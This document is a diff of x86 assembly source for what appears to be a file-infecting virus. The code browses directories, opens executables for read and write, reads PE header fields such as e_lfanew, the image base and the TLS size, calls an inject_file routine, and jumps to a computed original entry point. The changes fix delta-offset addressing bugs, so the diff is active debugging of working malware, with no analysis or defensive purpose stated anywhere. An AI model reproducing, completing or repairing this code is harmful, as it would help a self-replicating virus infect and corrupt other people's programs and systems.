@@ -317,11 +317,11 @@ add		ecx, ebp
 
 xor		ebx, ebx
 mov		ebx, [offset delta + ebp]
-
+;-----------------------------------------------------------------------------
 push	ebx
-push	ecx
+push	ecx								
 call	browse_files
-
+;------------------------------------------------------------------------------
 
 lea		eax, mg
 add		eax, ebp
@@ -344,6 +344,7 @@ mov		ebx, [ebx]
 
 push	262
 push	eax
+push	0
 call	ebx
 
 ;---------------------------------------------
@@ -362,10 +363,12 @@ push	080000000h			;read
 push	eax					;pathtmp
 call	ebx					;CreateFile	
 
-mov		h_file, eax
+lea		ebx, h_file
+add		ebx, ebp
+mov		[ebx], eax
 
-;-----------------------------------------
-lea		edx, ovl
+;e_lfanew-----------------------------------------
+lea		edx, ovl_g
 add		edx, ebp
 add		edx, 8
 mov		dword ptr [edx], 60
@@ -379,7 +382,8 @@ mov		ebx, [ebx]
 mov		ecx, offset h_file
 add		ecx, ebp
 mov		ecx, [ecx]
-lea		edx, ovl
+lea		edx, ovl_g
+add		edx, ebp
 
 push	edx
 push	0
@@ -391,8 +395,8 @@ call	ebx
 mov		eax, [offset tmp_1+ebp]
 add		eax, 34h
 
-;-----------------
-lea		edx, ovl
+;imagebase-----------------
+lea		edx, ovl_g
 add		edx, ebp
 add		edx, 8
 mov		dword ptr [edx], eax
@@ -406,7 +410,8 @@ mov		ebx, [ebx]
 mov		ecx, offset h_file
 add		ecx, ebp
 mov		ecx, [ecx]
-lea		edx, ovl
+lea		edx, ovl_g
+add		edx, ebp
 
 push	edx
 push	0
@@ -415,11 +420,11 @@ push	eax
 push	ecx
 call	ebx
 
-;------------------
+;TLS size------------------
 mov		eax, [offset tmp_1+ebp]
 add		eax, 0c4h
 
-lea		edx, ovl
+lea		edx, ovl_g
 add		edx, ebp
 add		edx, 8
 mov		dword ptr [edx], eax
@@ -433,7 +438,8 @@ mov		ebx, [ebx]
 mov		ecx, offset h_file
 add		ecx, ebp
 mov		ecx, [ecx]
-lea		edx, ovl
+lea		edx, ovl_g
+add		edx, ebp
 
 push	edx
 push	0
@@ -453,9 +459,15 @@ push	ebx
 call	eax
 
 ;-----------------------
-mov		eax, tmp_2
-add		eax, tmp_3
-cmp		eax, 00000000h
+lea		eax, tmp_2
+add		eax, ebp
+mov		eax, [eax]
+
+lea		ebx, tmp_3
+add		ebx, ebp
+mov		ebx, [ebx]
+add		eax, ebx
+cmp		ebx, 0ffffffffh
 je		file_virus
 jmp		eax
 file_virus:
@@ -1086,7 +1098,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	lea		eax,tmp_9
 	add		eax, del
-	mov		[eax], eax
+	mov		eax, [eax]
 	
 	lea		edx, ov
 	add		edx, 08h
@@ -1237,8 +1249,8 @@ push	0
 push	80h					;normal
 push	3					;OPEN_EXISTING
 push	0
-push	00000003h			;read va write
-push	0C0000000h			;read va write
+push 	3
+push 	0C0000000h
 push	eax					;pathtmp
 call	ebx					;CreateFile
 
@@ -1300,12 +1312,10 @@ mov		eax, tmp_5
 add		eax, 0c0h
 
 lea		edx, ovl
-add		edx, del
 add		edx, 8
 mov		dword ptr [edx], eax
 
 lea		eax, tmp_6
-add		eax, del
 mov		ebx, offset rf
 add		ebx, del
 mov		ebx, [ebx]
@@ -1327,12 +1337,10 @@ mov		eax, tmp_5
 add		eax, 0c4h
 
 lea		edx, ovl
-add		edx, del
 add		edx, 8
 mov		dword ptr [edx], eax
 
 lea		eax, tmp_5
-add		eax, del
 mov		ebx, offset rf
 add		ebx, del
 mov		ebx, [ebx]
@@ -1503,7 +1511,7 @@ call 	eax			;call RtlZeroMemory
 
 mov		eax, del
 add		eax, offset fnf
-mov		eax, [fnf]
+mov		eax, [eax]
 mov		ebx, hfind
 
 mov		ecx, del
@@ -1526,7 +1534,7 @@ browse_files endp
 
 ;------------------------------------------------------------------------
 
-ovl				dd 20 dup(0)
+ovl_g			dd 20 dup(0)
 delta			dd 0
 beg				dd 0
 kernel32		dd 0
